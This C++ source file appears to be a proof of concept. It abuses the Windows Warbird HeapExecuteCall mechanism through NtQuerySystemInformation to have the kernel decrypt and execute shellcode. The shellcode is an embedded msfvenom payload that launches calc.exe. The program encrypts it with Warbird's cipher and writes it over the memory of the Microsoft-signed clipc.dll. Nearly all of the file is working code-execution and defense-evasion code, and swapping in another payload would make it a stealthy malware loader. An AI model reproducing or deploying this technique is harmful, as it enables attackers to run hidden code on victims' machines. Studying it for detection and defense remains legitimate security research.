#include <iostream>

// These imports are required because Warbird headers don't have their own imports
#include <Windows.h>
#include <set>
#include <sstream>

#define WARBIRD_CRYPTO_ENABLE_CREATE_RANDOM // Required for WarbirdCrypto::CCipherFeistel64::CreateRandom
#include "../warbird-example/WarbirdCUtil.inl"
#include "../warbird-example/WarbirdRandom.inl"

// The WarbirdCiphers header is probably not inteded to be used outside the Warbird namespace.
// We have to get around this by defining this 'Random' macro for the header, so that
// it can access the random number generator and generate a random cipher
#define Random WarbirdRuntime::g_Rand.Random
#include "../warbird-example/WarbirdCiphers.inl"
#undef Random

// Required to compute the hash of the struct
#include "picosha2.h"

// Required to link against NtQuerySystemInformation
#pragma comment(lib, "ntdll.lib")

typedef struct _HEAP_EXECUTE_CALL_ARGUMENT {
    uint8_t ucHash[0x20];
    uint32_t ulStructSize;
    uint32_t ulZero;
    uint32_t ulParametersRva;
    uint32_t ulCheckStackSize;
    uint32_t ulChecksum : CHECKSUM_BIT_COUNT;
    uint32_t ulWrapperChecksum : CHECKSUM_BIT_COUNT;
    uint32_t ulRva : RVA_BIT_COUNT;
    uint32_t ulSize : FUNCTION_SIZE_BIT_COUNT;
    uint32_t ulWrapperRva : RVA_BIT_COUNT;
    uint32_t ulWrapperSize : FUNCTION_SIZE_BIT_COUNT;
    uint64_t ullKey;
    WarbirdRuntime::FEISTEL64_ROUND_DATA RoundData[NUMBER_FEISTEL64_ROUNDS];
} HEAP_EXECUTE_CALL_ARGUMENT, * PHEAP_EXECUTE_CALL_ARGUMENT;

typedef struct _WB_OPERATION {
    WarbirdRuntime::WbOperationType OperationType;
    union {
        // ...
        PHEAP_EXECUTE_CALL_ARGUMENT pHeapExecuteCallArgument;
        // ...
    };
    NTSTATUS* Result;
} WB_OPERATION, * PWB_OPERATION;

int main()
{
    // msfvenom -p windows/x64/exec CMD=calc.exe
    BYTE shellcode[] = {
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
        0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
        0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
        0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
        0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
        0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
        0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
        0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
        0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
        0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 
        0x65, 0x78, 0x65, 0x00 
    };

    BYTE encrypted[sizeof(shellcode)];
    auto cipher = WarbirdCrypto::CCipherFeistel64::CreateRandom();
    WarbirdCrypto::CChecksum checksum;
    WarbirdCrypto::CKey key { .u64 = 0xdeadbeefcafeaffe };
    cipher->Encrypt((BYTE*) shellcode, (BYTE*) encrypted, sizeof(shellcode), key, 0xf0, &checksum);
    
    HEAP_EXECUTE_CALL_ARGUMENT params{
    .ucHash = { }, // We'll leave this empty for now
    .ulStructSize = sizeof(HEAP_EXECUTE_CALL_ARGUMENT),
    .ulZero = 0,
    .ulParametersRva = 0,
    .ulCheckStackSize = 0,
    .ulChecksum = 0,
    .ulWrapperChecksum = 0,
    .ulRva = sizeof(HEAP_EXECUTE_CALL_ARGUMENT), // shellcode starts right after the struct
    .ulSize = static_cast<uint32_t>(sizeof(shellcode)),
    .ulWrapperRva = 0,
    .ulWrapperSize = 0,
    .ullKey = key.u64,
    .RoundData = { }
    };

    // Copy over the round configuration
    memcpy(params.RoundData, cipher->m_Rounds, sizeof(cipher->m_Rounds));

    // Lastly, calculate the hash of the struct
    picosha2::hash256(
        reinterpret_cast<uint8_t*>(&params.ulStructSize), // Start after the hash field
        reinterpret_cast<uint8_t*>(&params + 1), // Up to the end of the struct
        reinterpret_cast<uint8_t*>(&params.ucHash), // Store the hash here
        reinterpret_cast<uint8_t*>(&params.ulStructSize) // End of the hash field
    );

    // We now have the full struct computed and encrypted shellcode available.
    // Note that the encryption and struct construction can happen at compile time,
    // we just do it right before the execution for the purposes of this demo.

    // We will place the struct and payload at the start of this library's memory
    HMODULE clipc = LoadLibraryA("clipc.dll"); // Microsoft-signed DLL
    if (clipc == NULL) return 1;

    // Change the contents of the .text section to contain the struct and the encrypted shellcode
    DWORD old;
    VirtualProtect(clipc, sizeof(params) + sizeof(encrypted), PAGE_READWRITE, &old);
    memcpy(clipc, &params, sizeof(params));
    memcpy((uint8_t*)clipc + sizeof(params), &encrypted, sizeof(encrypted));
    VirtualProtect(clipc, sizeof(params) + sizeof(encrypted), PAGE_EXECUTE_READ, &old);

    // Construct the Warbird request and let the kernel do the rest.
    NTSTATUS result = 0;
    WB_OPERATION request{
        .OperationType = WarbirdRuntime::WbOperationHeapExecuteCall,
        .pHeapExecuteCallArgument = (PHEAP_EXECUTE_CALL_ARGUMENT)clipc,
        .Result = &result
    };

    NTSTATUS status = NtQuerySystemInformation(SystemCodeFlowTransition, &request, sizeof(request), nullptr);
}
